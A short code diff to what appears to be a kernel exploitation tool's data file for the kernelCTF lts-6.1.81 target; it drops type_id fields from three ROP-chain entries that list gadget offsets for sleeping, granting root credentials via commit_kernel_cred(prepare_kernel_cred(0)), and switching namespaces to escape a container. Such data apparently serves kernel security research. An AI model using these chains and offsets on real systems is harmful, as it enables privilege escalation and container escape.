@@ -14,7 +14,6 @@ from kxdb_tool.data_model.serialization import *
 rop_actions = {
     "kernelctf/lts-6.1.81": [
         RopAction(
-          type_id=0x01,
           description="msleep(ARG_time_msec)",
           gadgets=[
             RopChainOffset(kernel_offset=0x21f5, description="pop rdi"),
@@ -23,7 +22,6 @@ rop_actions = {
 
         # commit_kernel_cred(prepare_kernel_cred(0))
         RopAction(
-          type_id=0x02,
           description="commit_kernel_cred(prepare_kernel_cred(0))",
           gadgets=[
             RopChainOffset(kernel_offset=0x21f5, description="pop rdi"),
@@ -34,7 +32,6 @@ rop_actions = {
 
         # switch_task_namespaces(find_task_by_vpid(ARG_vpid), init_nsproxy)
         RopAction(
-          type_id=0x03,
           description="switch_task_namespaces(find_task_by_vpid(ARG_vpid), init_nsproxy)",
           gadgets=[
             RopChainOffset(kernel_offset=0x21f5, description="pop rdi"),
